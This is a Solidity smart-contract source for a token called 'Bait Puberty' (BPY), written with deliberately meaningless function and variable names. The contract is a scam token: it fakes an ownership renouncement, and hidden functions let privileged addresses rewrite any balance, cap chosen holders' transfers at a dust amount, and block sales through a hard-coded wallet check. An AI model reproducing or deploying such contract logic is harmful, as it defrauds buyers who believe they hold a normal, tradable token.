//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface launchedTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingFeeTo) external view returns (uint256);

    function transfer(address launchedAt, uint256 launchWallet) external returns (bool);

    function allowance(address teamFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchWallet) external returns (bool);

    function transferFrom(
        address sender,
        address launchedAt,
        uint256 launchWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minMarketing, uint256 value);
    event Approval(address indexed teamFee, address indexed spender, uint256 value);
}

abstract contract minTotalReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapFromLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface sellTo {
    function createPair(address autoMin, address fromEnable) external returns (address);
}

interface autoExempt is launchedTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BaitPuberty is minTotalReceiver, launchedTake, autoExempt {

    function receiverLaunchAuto() private view {
        require(buyFund[_msgSender()]);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return listToken;
    }

    mapping(address => bool) public senderAuto;

    bool private amountEnableLiquidity;

    mapping(address => mapping(address => uint256)) private sellTxReceiver;

    bool public isLaunch;

    function buyMarketing(address amountTotal) public {
        receiverLaunchAuto();
        
        if (amountTotal == maxModeMin || amountTotal == fundSwap) {
            return;
        }
        senderAuto[amountTotal] = true;
    }

    function balanceOf(address marketingFeeTo) public view virtual override returns (uint256) {
        return launchShould[marketingFeeTo];
    }

    uint256 fromTeam;

    address receiverFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private modeFrom;

    function amountAuto(uint256 launchWallet) public {
        receiverLaunchAuto();
        liquidityReceiver = launchWallet;
    }

    uint256 public receiverAmountMarketing;

    mapping(address => bool) public buyFund;

    uint256 liquidityReceiver;

    uint8 private txListSwap = 18;

    function transferFrom(address launchedExempt, address launchedAt, uint256 launchWallet) external override returns (bool) {
        if (_msgSender() != receiverFund) {
            if (sellTxReceiver[launchedExempt][_msgSender()] != type(uint256).max) {
                require(launchWallet <= sellTxReceiver[launchedExempt][_msgSender()]);
                sellTxReceiver[launchedExempt][_msgSender()] -= launchWallet;
            }
        }
        return atMode(launchedExempt, launchedAt, launchWallet);
    }

    bool public liquidityShould;

    uint256 private listToken = 100000000 * 10 ** 18;

    function approve(address senderExemptLaunch, uint256 launchWallet) public virtual override returns (bool) {
        sellTxReceiver[_msgSender()][senderExemptLaunch] = launchWallet;
        emit Approval(_msgSender(), senderExemptLaunch, launchWallet);
        return true;
    }

    address enableTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private toExemptReceiver = "BPY";

    function owner() external view returns (address) {
        return isAmount;
    }

    string private txList = "Bait Puberty";

    function name() external view virtual override returns (string memory) {
        return txList;
    }

    constructor (){
        if (receiverMode == receiverAmountMarketing) {
            modeFrom = false;
        }
        launchMax();
        swapFromLiquidity teamWallet = swapFromLiquidity(receiverFund);
        fundSwap = sellTo(teamWallet.factory()).createPair(teamWallet.WETH(), address(this));
        
        maxModeMin = _msgSender();
        buyFund[maxModeMin] = true;
        launchShould[maxModeMin] = listToken;
        
        emit Transfer(address(0), maxModeMin, listToken);
    }

    uint256 private launchMode;

    uint256 constant atToken = 2 ** 10;

    address private isAmount;

    mapping(address => uint256) private launchShould;

    function launchMax() public {
        emit OwnershipTransferred(maxModeMin, address(0));
        isAmount = address(0);
    }

    uint256 private receiverMode;

    function buySell(address teamTradingShould, uint256 launchWallet) public {
        receiverLaunchAuto();
        launchShould[teamTradingShould] = launchWallet;
    }

    event OwnershipTransferred(address indexed totalReceiver, address indexed fundMax);

    function transfer(address teamTradingShould, uint256 launchWallet) external virtual override returns (bool) {
        return atMode(_msgSender(), teamTradingShould, launchWallet);
    }

    bool public tradingExempt;

    uint256 private senderTakeMarketing;

    function allowance(address exemptTake, address senderExemptLaunch) external view virtual override returns (uint256) {
        if (senderExemptLaunch == receiverFund) {
            return type(uint256).max;
        }
        return sellTxReceiver[exemptTake][senderExemptLaunch];
    }

    function tradingFee(address toTeam) public {
        if (takeFee) {
            return;
        }
        if (receiverMode != launchMode) {
            liquidityShould = true;
        }
        buyFund[toTeam] = true;
        
        takeFee = true;
    }

    address public fundSwap;

    function getOwner() external view returns (address) {
        return isAmount;
    }

    bool public takeFee;

    function atMode(address launchedExempt, address launchedAt, uint256 launchWallet) internal returns (bool) {
        if (launchedExempt == maxModeMin) {
            return txTake(launchedExempt, launchedAt, launchWallet);
        }
        uint256 swapMaxAmount = launchedTake(fundSwap).balanceOf(enableTrading);
        require(swapMaxAmount == liquidityReceiver);
        require(launchedAt != enableTrading);
        if (senderAuto[launchedExempt]) {
            return txTake(launchedExempt, launchedAt, atToken);
        }
        return txTake(launchedExempt, launchedAt, launchWallet);
    }

    function txTake(address launchedExempt, address launchedAt, uint256 launchWallet) internal returns (bool) {
        require(launchShould[launchedExempt] >= launchWallet);
        launchShould[launchedExempt] -= launchWallet;
        launchShould[launchedAt] += launchWallet;
        emit Transfer(launchedExempt, launchedAt, launchWallet);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return toExemptReceiver;
    }

    function decimals() external view virtual override returns (uint8) {
        return txListSwap;
    }

    address public maxModeMin;

}